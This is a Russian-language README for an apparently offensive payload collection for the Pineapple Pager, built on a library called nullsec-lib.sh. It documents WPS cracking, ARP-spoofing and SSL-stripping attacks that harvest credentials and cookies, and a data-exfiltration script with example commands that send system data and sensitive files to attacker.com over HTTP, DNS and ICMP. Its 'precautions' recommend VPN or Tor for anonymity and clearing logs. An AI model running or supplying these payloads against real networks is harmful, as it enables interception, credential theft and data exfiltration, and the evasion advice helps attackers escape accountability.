# Примеры пейлоудов для Pineapple Pager

Этот каталог содержит примеры пейлоудов, демонстрирующих использование `nullsec-lib.sh` для различных типов атак и операций на Pineapple Pager.

## Структура пейлоудов

### 1. wifi-scanner-payload.sh
**Назначение:** Сканирование беспроводных сетей с сохранением результатов в базу данных.

**Функции:**
- Сканирование WiFi сетей с помощью `iwinfo`
- Сохранение результатов в SQLite базу данных
- Отображение информации о найденных сетях
- Периодическое сканирование

**Использование:**
```bash
./wifi-scanner-payload.sh [интерфейс] [интервал]
```

**Пример:**
```bash
./wifi-scanner-payload.sh wlan0 30
```

### 2. wps-attack-payload.sh
**Назначение:** Атаки на WPS-уязвимые точки доступа (Pixie Dust + Reaver).

**Функции:**
- Сканирование WPS-уязвимых сетей
- Pixie Dust атака через `pixiewps`
- Брутфорс атака через `reaver`
- Сохранение результатов атак

**Использование:**
```bash
./wps-attack-payload.sh <BSSID> [канал]
```

**Пример:**
```bash
./wps-attack-payload.sh AA:BB:CC:DD:EE:FF 6
```

### 3. mitm-attack-payload.sh
**Назначение:** Man-in-the-Middle атаки с ARP spoofing и SSL stripping.

**Функции:**
- ARP spoofing между целью и шлюзом
- SSL stripping для перехвата HTTPS трафика
- Захват и анализ HTTP трафика
- Поиск учетных данных и cookies в трафике
- Сохранение перехваченных данных

**Использование:**
```bash
./mitm-attack-payload.sh <target_ip> <gateway_ip> [interface]
```

**Пример:**
```bash
./mitm-attack-payload.sh 192.168.1.100 192.168.1.1 wlan0
```

### 4. data-exfil-payload.sh
**Назначение:** Эксфильтрация данных различными методами.

**Функции:**
- Сбор системной информации (hostname, kernel, uptime, etc.)
- Сбор сетевой информации (сканирование, ARP таблица, DNS)
- Поиск конфиденциальных файлов
- Эксфильтрация через HTTP, DNS или ICMP
- Периодическая эксфильтрация

**Использование:**
```bash
./data-exfil-payload.sh [server] [method] [interface]
```

**Примеры:**
```bash
# HTTP эксфильтрация
./data-exfil-payload.sh http://attacker.com:8080 http wlan0

# DNS эксфильтрация
./data-exfil-payload.sh attacker.com dns wlan0

# ICMP эксфильтрация
./data-exfil-payload.sh attacker.com icmp wlan0
```

## Общие требования

### Зависимости
Все пейлоуды требуют установленной `nullsec-lib.sh` и следующих пакетов:
- `curl` - для HTTP запросов
- `jq` - для обработки JSON
- `sqlite3` - для базы данных
- `iwinfo` - для WiFi сканирования
- `pixiewps` - для WPS атак
- `reaver` - для WPS брутфорса
- `dsniff` - для ARP spoofing
- `sslstrip` - для SSL stripping

### Установка зависимостей
```bash
# На Pineapple Pager
opkg update
opkg install curl jq sqlite3-cli iwinfo pixiewps reaver dsniff sslstrip
```

### Установка библиотеки
```bash
# Копирование на устройство
scp library/nullsec-lib.sh root@pineapple:/usr/lib/

# Установка прав
ssh root@pineapple 'chmod +x /usr/lib/nullsec-lib.sh'
```

## Безопасность

⚠️ **Важно:** Эти пейлоуды предназначены только для образовательных и исследовательских целей. Использование в реальных сетях без разрешения является незаконным.

### Меры предосторожности:
- Всегда тестируйте в контролируемой среде
- Используйте VPN или Tor для анонимизации
- Не храните чувствительные данные в логах
- Регулярно очищайте базу данных после использования

## Разработка собственных пейлоудов

### Шаблон пейлоуда
```bash
#!/bin/sh
# my-payload.sh — Описание пейлоуда

# Подключение библиотеки
. /usr/lib/nullsec-lib.sh

# Заголовок пейлоуда
nullsec_payload_header "My Payload" "1.0.0"

# Ваша логика здесь
# Используйте функции из nullsec-lib.sh

# Завершение
nullsec_payload_footer "My Payload" "completed"
```

### Полезные функции библиотеки
- `nullsec_log "message"` - логирование
- `nullsec_scan_wifi wlan0 10` - сканирование WiFi
- `nullsec_http_get "url"` - HTTP запросы
- `nullsec_init_db` - инициализация базы данных
- `nullsec_ping "ip"` - проверка доступности

## Отладка

### Включение отладки
```bash
export NULLSEC_DEBUG=1
./payload.sh
```

### Просмотр логов
```bash
# Логи пейлоудов
tail -f /var/log/nullsec-payloads.log

# Логи библиотеки
tail -f /var/log/nullsec-lib.log
```

### Проверка базы данных
```bash
sqlite3 /tmp/nullsec_payloads.db
.schema
SELECT * FROM payloads;
```

## Поддержка

При возникновении проблем:
1. Проверьте логи в `/var/log/nullsec-*.log`
2. Убедитесь, что все зависимости установлены
3. Проверьте права доступа к файлам
4. Попробуйте переустановить библиотеку

## Лицензия

MIT License - см. LICENSE файл в корне проекта.